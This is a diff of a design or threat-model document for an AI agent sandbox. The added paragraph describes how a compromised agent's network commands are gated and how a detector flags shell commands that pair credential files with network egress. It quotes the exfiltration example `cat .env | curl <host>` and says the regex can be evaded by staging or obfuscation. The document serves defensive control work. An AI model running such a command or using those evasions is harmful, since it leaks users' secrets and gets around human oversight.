@@ -33,7 +33,7 @@ private model gateway never inspects.
 **Control.** Network tools are gated by host allowlist; unknown destinations escalate. The
 risk score spikes when the command also touches `.env`/`.ssh`/credential paths. Outbound
 approved-command output is run through the secret/PII scrubber before it re-enters context.
-This is the **kill-chain demo**: reasoning layer compromised, authorization layer holds.
+This is the **kill-chain demo**: reasoning layer compromised, authorization layer holds. In addition, a shell command that combines a sensitive source with a network egress is detected deterministically ([safety/exfil.py](../src/sandbox/safety/exfil.py)) and forced to dual control with an explicit approver reason, which also closes an allowlist hole (`cat` is allowlisted, so `cat .env | curl <host>` previously ran silently). Regex is evadable (staging to a temp file, obfuscation); it raises scrutiny, it does not guarantee.
 
 ## Goal 4 — Policy manipulation
 
